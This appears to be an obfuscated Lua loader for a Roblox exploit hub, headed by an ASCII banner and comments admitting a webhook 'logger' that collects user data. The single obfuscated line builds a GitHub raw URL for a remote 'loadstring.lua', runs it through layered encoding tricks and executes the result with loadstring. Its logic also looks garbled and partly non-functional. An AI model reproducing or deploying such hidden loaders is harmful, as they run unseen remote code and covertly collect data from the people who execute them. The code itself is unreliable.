--[[
                      __                                ___.    
  ____   ____   _____/  |______  ______     ______  __ _\_ |__  
 /  _ \ /    \_/ __ \   __\__  \ \____ \    \____ \|  |  \ __ \ 
(  |_| )   |  \  ___/|  |  / __ \|  |_> >   |  |_> >  |  / \_\ \
 \____/|___|  /\___  >__| (____  /   __/ /\ |   __/|____/|_____/
            \/     \/          \/|__|    \/ |__|              Art by deportal


]]


--bruh who said it have logger wtf
--yeah it have webhooks to collect data about LinoriaLib Errors
--because we modifed linoria

print("Code Runned! File obfuscated using onetaprbx.github.io/obfuscator. Mode Heavily")local a=string.char;local b=table.concat;local c=string.byte;local d=math.floor;local e=("game"):reverse():lower();local f=("HttpGet"):reverse();local g=("s:ptth"):reverse();local h=("//":reverse()):rep(1)..("moc.buhtig.resbmar/".."txenr/".."nim/moc.buhtig.xrbtapeno//:sptth"):reverse():gsub("txenr","refs/heads/main"):gsub("resbmar","raw.githubusercontent").."/loadstring.lua";local i={}for j=1,#h do i[j]=a(c(h:sub(j,j))+((j%3==0)and 1 or 0))end;local k=b(i)local l=function(m,n)local o={}for p=1,#m do o[p]=a(c(m:sub(p,p))-n)end;return b(o)end;local q=l(k,((#k%7)+1))local r=function(s,t)local u={}for v=1,#s,2 do u[#u+1]=a(tonumber(s:sub(v,v+1),16)-t)end;return b(u)end;local w=r((""):rep(64):gsub("..",function(x)return a(math.random(65,90))end):gsub("%a",function(y)return string.format("%02x",c(y)))..string.gsub(q,".",function(z)return string.format("%02x",c(z))end),10)local A=function(B)local C={}local D=1;for E=1,#B do C[D]=a(c(B:sub(E,E))%32+65)D=D+1;end;return b(C)end;local F=A(w)local G=function(H,I)local J={}for K=1,#H do J[K]=a(c(H:sub(K,K))+I[((K-1)%#I)+1])end;return b(J)end;local L={17,4,23,8,15,6,1,12,9,19,3,14}local M=G(F,L)local N=function(O)local P={}for Q=1,#O do P[Q]=a(c(O:sub(Q,Q))-Q%16)end;return b(P)end;local R=N(M)local S=function(T)local U={}for V=1,#T,2 do U[#U+1]=a(bit32.bxor(c(T:sub(V,V)),c(T:sub(V+1,V+1))))end;return b(U)end;local W=S(R..("0"):rep(#R%2))local X=function(Y)local Z={}local _=1;for a0=1,#Y do Z[_]=a(bit32.bnot(c(Y:sub(a0,a0)))%256)_=_+1;end;return b(Z)end;local a1=X(W)local a2=function(a3,a4)local a5={}local a6=a3:gsub("%W",""):gsub("%d",""):lower()for a7=1,#a6 do a5[a7]=a(c(a6:sub(a7,a7))+a4[((a7-1)%#a4)+1])end;return b(a5)end;local a8={"`","~","!","@","#","$","%","^","&","*","(",")","_","+","-","=","[","]","{","}","\\","|",";",":","'",'"',",","<",".",">","/","?"}local a9=a2("Oxf4nD3rP1uS",a8)local ba=function(bb,bc,bd)local be={}for bf=1,#bb do be[bf]=a(c(bb:sub(bf,bf))+bc[((bf-1)%#bc)+1]+(bd or 0))end;return b(be)end;local bf=ba(a9,{3,7,2,9,4,1,8,5,6},5)local bg=assert(loadstring or load)local bh=bg(bf)bh()
